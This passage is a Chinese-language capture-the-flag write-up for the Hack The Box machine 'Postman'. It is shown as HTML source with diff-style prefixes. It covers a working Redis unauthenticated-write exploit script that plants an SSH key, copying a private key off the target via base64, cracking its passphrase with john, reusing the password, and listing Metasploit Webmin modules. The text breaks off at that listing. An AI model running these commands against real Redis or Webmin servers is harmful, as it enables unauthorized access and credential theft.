-80/tcp    open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
-|_http-title: The Cyber Geek&lt;span class=&quot;s1&quot;&gt;'s Personal Website
-6379/tcp  open  redis   Redis key-value store 4.0.9
-10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
-|_http-title: Site doesn'&lt;/span&gt;t have a title &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;text/html&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;Charset&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;iso-8859-1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;c&quot;&gt;# Nmap done at Thu Nov 28 05:28:35 2019 -- 1 IP address (1 host up) scanned in 89.52 seconds&lt;/span&gt;
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;发现开放了4个端口， 80 端口在查看页面和扫描目录后未发现特别明显的漏洞，先继续看看后面两个端口。&lt;/p&gt;
-
-&lt;h2 id=&quot;0x02-redis-未授权访问漏洞利用&quot;&gt;0x02 Redis 未授权访问漏洞利用&lt;/h2&gt;
-
-&lt;p&gt;发现 6379 端口运行着 Redis 服务，且版本较低，存在未授权访问漏洞，可以将本地 ssh 公钥写进远程靶机从而  getshell&lt;/p&gt;
-
-&lt;p&gt;exploit 如下：&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-shll&quot;&gt;#!/bin/bash
-rm /root/.ssh/id*
-ssh-keygen -t rsa
-
-(echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &amp;gt; foo.txt
-
-redis-cli -h 10.10.10.160 flushall
-cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
-redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh/
-redis-cli -h 10.10.10.160 config set dbfilename &quot;authorized_keys&quot;
-redis-cli -h 10.10.10.160 save
-
-ssh -i /root/.ssh/id_rsa redis@10.10.10.160
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;具体说明：&lt;/p&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;将本地 kali 的 ssh 公钥写进文本 foo 中，在其前后添加换行符 &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt; 为了避免和Redis里其他缓存数据混合&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;redis-cli &lt;code class=&quot;highlighter-rouge&quot;&gt;-x&lt;/code&gt; 参数：代表从标准输入读取数据作为该命令的最后一个参数。&lt;/p&gt;
-
-    &lt;p&gt;例：&lt;code class=&quot;highlighter-rouge&quot;&gt;$echo &quot;world&quot; |redis-cli -x set hello&lt;/code&gt; 等价于 &lt;code class=&quot;highlighter-rouge&quot;&gt;redis-cli set hello world&lt;/code&gt;&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;该版本的 Redis 允许任意用户未授权访问并写文件，同时 Redis 在其默认目录下拥有 ssh 密钥并对其有写权限。这导致攻击者可以用自己的公钥覆盖原文件，实现远程登录。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;这里设定了 crackit 的键值为公钥，并通过 redis 命令变更 Redis DB 文件及存放地点为用户的 &lt;code class=&quot;highlighter-rouge&quot;&gt;.ssh&lt;/code&gt; 文件夹，并将 &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; 覆盖&lt;/p&gt;
-
-    &lt;p&gt;这样就可以成功的将自己的公钥写入 /.ssh 文件夹的 authotrized_keys 文件里，然后攻击者就可以直接用 ssh 免密登录&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;因为靶机一直被所有人频繁修改和复写，一开始连接时需要使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;flushall&lt;/code&gt; 删除所有数据库中的所有key&lt;/p&gt;
-
-    &lt;blockquote&gt;
-      &lt;p&gt;&lt;a href=&quot;https://www.00theway.org/2017/03/27/redis_exp/&quot;&gt;redis未授权访问利用&lt;/a&gt;&lt;/p&gt;
-
-      &lt;p&gt;&lt;a href=&quot;https://damit5.com/2018/05/18/Redis未授权访问漏洞利用/#写入SSH公钥直接连接&quot;&gt;Redis未授权访问漏洞利用&lt;/a&gt;&lt;/p&gt;
-    &lt;/blockquote&gt;
-  &lt;/li&gt;
-&lt;/ol&gt;
-
-&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;在试图 &lt;code class=&quot;highlighter-rouge&quot;&gt;set key&lt;/code&gt; 时，可能会爆出错误 &lt;code class=&quot;highlighter-rouge&quot;&gt;(error) READONLY You can't write against a read only slave.&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;主要是因为所有人都在尝试攻破靶机，可能输入某些奇怪的命令使 redis 变成了从服务器，导致无法写入，需要使用 &lt;code class=&quot;highlighter-rouge&quot;&gt;SLAVEOF no one&lt;/code&gt; 使其变回主服务器。&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/5616#toc-3&quot;&gt;SLAVEOF&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;https://juejin.im/post/58d4e31aa22b9d00645634fc&quot;&gt;Redis 主从复制常见问题&lt;/a&gt;&lt;/p&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;10.10.10.160:6379&amp;gt; set key &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n&quot;
-(error) READONLY You can't write against a read only slave.
-10.10.10.160:6379&amp;gt; SLAVEOF no one
-OK
-10.10.10.160:6379&amp;gt; set key &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5H80/PWYu0XeLVEQchqCtinGauFmpNPWJ//IkaeqceSE3YL6QeY33ipgkskpe1R/29jKhLJIkP0ku9ozPW9kIlz4HCDPm2C1V3tnaFAMz6P96HBGrd1XDa0cTjOkOgkeAW/YW0STn3pfjAUYXd3pIkQiD1zgkYvs2Y/Jkk+8BZ9+9nmSQkX7ic4jCwBF+HVlg4uGqK/McInB/LWNhnonRuQ0mx/IG2nSmWTX+EoFmWGyY8r2ODRr8MkxX5s9eBqhR94EiArsatHHN+Z2jWA8QhGqXliE/uQtXN42fU8P8G+VqpsADu8ZnblvTfSsVptSe0Fs6V63J1AUike9G1ejH root@kali\n\n&quot;
-OK
-(0.95s)
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x03-usertxt&quot;&gt;0x03 User.txt&lt;/h2&gt;
-
-&lt;p&gt;拿到 redis 的低权限 shell 后，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; 目录下发现用户 Matt，&lt;code class=&quot;highlighter-rouge&quot;&gt;su Mutt&lt;/code&gt; 尝试切换发现需要密码。在 &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; 文件中发现存在 &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa_bak&lt;/code&gt;，因此遍历各个关键目录查找线索，在 &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/opt&lt;/code&gt; 下发现 &lt;code class=&quot;highlighter-rouge&quot;&gt;ida_rsa.bak&lt;/code&gt; 文件，应该是 Matt 的 ssh 私钥，下面开始爆破。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam2ib83kzj316g0u048k.jpg&quot; alt=&quot;Xnip2020-01-05_22-44-39&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;通过 &lt;code class=&quot;highlighter-rouge&quot;&gt;base64&lt;/code&gt; 和 &lt;code class=&quot;highlighter-rouge&quot;&gt;base64 -d&lt;/code&gt; 将文件拷贝到本地 kali，命名为 Mattssh_bak&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;redis@Postman:/var&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /opt
-redis@Postman:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;id_rsa.bak
-redis@Postman:/opt&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;base64 &lt;/span&gt;id_rsa.bak 
-LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRF
-Sy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlX
-eCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtL
-Sm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdH
-c1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNq
-cDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGly
-cVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlN
-R1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZ
-dXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgz
-d2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpC
-VUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3Qw
-Vko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1p
-OEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVds
-cGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5Kcjcv
-TWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0
-S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpL
-ZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdw
-M0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4
-VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZm
-M21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6
-VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRK
-M3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dW
-cExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0Jj
-eU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3
-TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRS
-VDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJK
-MThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1
-a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnla
-SDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZp
-NVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3
-PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@kali:~/Desktop/ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpQcm9jLVR5cGU6IDQsRU5DUllQVEVECkRFSy1JbmZvOiBERVMtRURFMy1DQkMsNzNFOUNFRkJDQ0Y1Mjg3QwoKSmVoQTUxSTE3cnNDT09WcXlXeCtDODM2M0lPQllYUTExRGR3L3ByM0wyQTJORHRCN3R2c1hOeXFLRGdoZlFuWApjd0dKSlVEOWtLSm5pSmtKenJ2RjFXZXB2TU5rajlaSXRYUXpZTjh3Ympscmt1MWJKcTV4bkpYOUVVYjVJN2syCjdHc1R3c012S3pYa2tmRVpRYVhLL1Q1MHMzSTRDZGNmYnIxZFhJeWFiWExMcFpPaVpFS3ZyNCtLeVNqcDRvdTYKY2RuQ1doemtBL1R3SnBYRzFXZU9tTXZ0Q1pXMUhDQnV0WXNOUDZCRGY3OGJRR21tbGlycVJtWGZMQjkySmhUOQoxdThKekhDSjF6Wk1HNXZhVXR2b24wcWdQeDd4ZUlVTzZMQUZUb3pyTjlNR1dFcUJFSjV6TVZycnQzVEdWa2N2CkV5dmxXd2tzN1IvZ2p4SHlVd1QrYTVMQ0dHU2pWRDg1THhZdXRnV3hPVUtidFdHQmJVOHlpN1lzWGxLQ3d3SFAKVUg3T2ZRejAzVld5K0swYWE4UXMrRXl3Nlgzd2JXbnVlMDNuZy9zTEpuSjcyOXpiM2t1eW04citoVSs5djZWWQpTaitRbmpWVFlqRGZuVDIyakpCVUhUVjJ5cktlQXo2Q1hkRlQreEloeEVBaXYwbTFaa2t5UWtXcFVpQ3p5dVlLCnQrTVN0d1d0U3QwVko0VTFOYTJHM3hHUGptcmttandYdnVkS0MwWU4vT0JvUFBPVGFCVkQ5aTZmc29aNnB3blMKNU1pOEJ6ckJoZE8wd0hhRGNUWVBjM0IwMEN3cUFWNU1YbWtBazJ6S0wwVzJ0ZFZZa3NLd3hLQ3dHbVdscGRrZQpQMkpHbHA5TFdFZXJNZm9sYmpUU09VNW1EZVBmTVEzZndDTzZNUEJpcXpyckZjUE5KcjcvTWNRRUNiNXNmK082CmpLRTNKZm4wVVZFMlFWZFZLM29FTDZEeWFCZi9XMmQvM1Q3cTEwVWQ3Sys0S2QzNmd4TUJmMzNFYTYrcXgzR2UKU2JKSWhrc3c1VEtoZDUwNUFpVUgyVG44OXFOR2VjVkpFYmpLZUovdkZaQzVZSXNRKzlzbDg5VG1KSEw3NFkzaQpsM1lYREVzUWpoWkh4WDVYL1JVMDJEK0FGMDdwM0JTUmpoRDMwY2pqMHV1V2tLb3dwb28wWTBlYmxnbWQ3bzJYCjBWSVdyc2tQSzRJN0lINWdia3J4VkdiLzlnL1cydWExQzNObmN2M01OY2YwbmxJMTE3QlMvUXdOdHVUb3pHOHAKUzlrM2xpK3JZcjZmM21hL1VMc1VuS2labHM4U3BVK1JzYW9zTEdLWjZwMm9JZThvUlNtbE9Dc1kwSUNxN2VSUgpoa3V6VXVIOXovbUJvMnRRV2g4cXZUb0NTRWpnOHlOTzl6OCtMZG9OMXdRV01QYVZ3UkJqSXl4Q1BIRlRKM3UrClp4eTB0SVB3akNadnhVZlluL0s0RlZIYXZ2QStiOWxvcG5VQ0VBRVJwd0l2OCt0WW9md0dWcExWQzBEck41OFYKWFRmQjJYOXNMMW9CM2hPNG1KRjBaM3lKMktaRWRZd0hHdXFOVEZhZ04wZ0JjeU5JMndzeFpOeklLMjZ2UHJPRApiNkJjOVVkaVdDWnFNS1V4NGFNVExoRzVST2pnUUd5dFdmL3E3TUdyTzNjRjI1azFQRVdOeVpNcVk0V1lzWlhpCldoUUZIa0ZPSU53VkVPdEhha1ovVG9ZYVVRTnRSVDZwWnlIZ3ZqVDBtVG8wdDNqVUVSc3BwajFwd2JnZ0NHbWgKS1RrbWhLK01UYW95ODlDZzBYdzJKMThEbTBvNzhwNlVOcmtTdWUxQ3NXakVmRUlGM05BTUVVMm8rTmdxOTJIbQpucEFGUmV0dndRN3h1a2swcmJiNm12RjhnU3FMUWc3V3BiWkZ5dGdTMDVUcFBaUE0waDh0UkU4WVJkSmhlV3JRClZjTnlaSDhPSFlxRVM0ZzJVRjYyS3B0dHFTd0xpaUY0dXRIcSsvaDVDUXdzRitKUmc4OGJueGgyejJCRDZpNVcKWCtoSzVIUHBwNlFualo4QTVFUnVVRUdhWkJFVXZHSnRQR0hqWnlMcGt5dE1oVGphT3JSTll3PT0KLS0tLS1FTkQgUlNBIFBSSVZBVEUgS0VZLS0tLS0K&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Mattssh_bak 
-
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;和上一篇博客一样，之后在本机使用 ssh2john 将密钥转换为可破解的哈希格式，再使用 john 的自带字典进行 passphrase 的爆破&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;root@kali:~/home# ssh2john Mattssh_bak &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; matthash
-root@kali:~/home# john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt matthash
-Using default input encoding: UTF-8
-Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;RSA/DSA/EC/OPENSSH &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSH private keys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 32/64]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-Cost 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KDF/cipher &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/AES &lt;span class=&quot;nv&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MD5/3DES &lt;span class=&quot;nv&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Bcrypt/AES]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 1 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
-Cost 2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;iteration count&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is 2 &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;all loaded hashes
-Will run 4 OpenMP threads
-Note: This format may emit &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives, so it will keep trying even after
-finding a possible candidate.
-Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
-computer2008     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Matts.key&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-1g 0:00:00:01 10.16% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ETA: 04:52:13&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.5319g/s 862502p/s 862502c/s 862502C/s kifra9..kieukieu
-Session aborted
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;得到 ssh 的密钥 &lt;code class=&quot;highlighter-rouge&quot;&gt;computer2008&lt;/code&gt;，但直接使用 ssh 无法成功登录，毕竟这是备份密钥，可能已经无法使用。但 &lt;code class=&quot;highlighter-rouge&quot;&gt;computer2008&lt;/code&gt; 作为 Matt 的一个密码可能会被重用在别的地方。先登录 redis 用户，再切换用户，尝试将密码输入，bingo!&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;redis@Postman:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su Matt
-Password: 
-Matt@Postman:/var/lib/redis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;Matt
-Matt@Postman:/var/lib/redis&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd
-&lt;/span&gt;Matt@Postman:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;user.txt
-&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;0x04-roottxt&quot;&gt;0x04 Root.txt&lt;/h2&gt;
-
-&lt;p&gt;想起之前 10000 端口的 Webmin 服务，提示网站使用 SSL，将网址的 http 换成 https 即可。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fmt3f1j31c00u0jzi.jpg&quot; alt=&quot;Xnip2020-01-05_21-25-59&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;使用 Matt 和 computer2008 尝试登录，登录成功，网站本身没有什么东西，再次注意到 Webmin 的版本，搜索是否存在相关 exploit。&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0fxzn4yj31c00u0n54.jpg&quot; alt=&quot;Xnip2020-01-05_21-26-19&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/006tNbRwgy1gam0gatz9fj31c00u0aon.jpg&quot; alt=&quot;Xnip2020-01-05_21-29-21&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;发现 msf 已经集成了针对该版本可利用的 exploit&lt;/p&gt;
-
-&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;table class=&quot;rouge-table&quot;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td class=&quot;rouge-gutter gl&quot;&gt;&lt;pre class=&quot;lineno&quot;&gt;1
-2
-3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-15
-16
-17
-18
-19
-20
-21
-22
-23
-24
-25
-26
-27
-28
-29
-30
-31
-32
-33
-34
-35
-36
-37
-38
-39
-40
-41
-42
-43
-44
-45
-46
-47
-&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;rouge-code&quot;&gt;&lt;pre&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; search webmin
-
-Matching Modules
-&lt;span class=&quot;o&quot;&gt;================&lt;/span&gt;
-
-   &lt;span class=&quot;c&quot;&gt;#  Name                                         Disclosure Date  Rank       Check  Description&lt;/span&gt;
-   -  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                         &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;-----&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
-   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
-   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
-   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
-   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
